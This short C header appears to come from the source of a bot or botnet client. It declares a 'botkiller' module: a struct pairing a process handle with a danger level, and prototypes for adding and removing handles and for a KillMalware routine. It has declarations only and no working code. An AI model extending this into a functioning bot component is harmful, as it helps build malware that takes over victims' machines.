#pragma once
#include "modules.h"

#ifdef MODULE_BOTKILLER
#include "bot_structs.h"

typedef struct
{
	HANDLE hProcess; //The process that dangerous functions will be executed on.
	unsigned int iDangerLevel;
}botkill_process_t;

void WINAPI InitBotkiller(void);
void WINAPI AddBotkillHandle(HANDLE hProcess);
void WINAPI RemoveBotkillHandle(HANDLE hProcess);
void WINAPI KillMalware(void);
#endif